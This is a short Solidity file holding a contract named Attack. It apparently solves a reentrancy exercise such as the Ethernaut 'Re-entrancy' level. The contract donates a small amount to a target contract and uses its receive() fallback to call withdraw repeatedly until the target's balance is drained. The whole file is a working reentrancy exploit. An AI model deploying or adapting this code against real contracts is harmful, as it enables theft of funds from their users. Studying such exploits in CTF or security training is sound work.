// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack{
    IReentrance public target;
    uint256 constant public amount = 0.001 ether;

    constructor(address _target) payable{
       target = IReentrance(_target);
    }

    function donateToTarget() external {
        target.donate{value: amount}(address(this));
    }

    receive() external payable{
        if(address(target).balance != 0){
            target.withdraw(amount);
        }
    }
}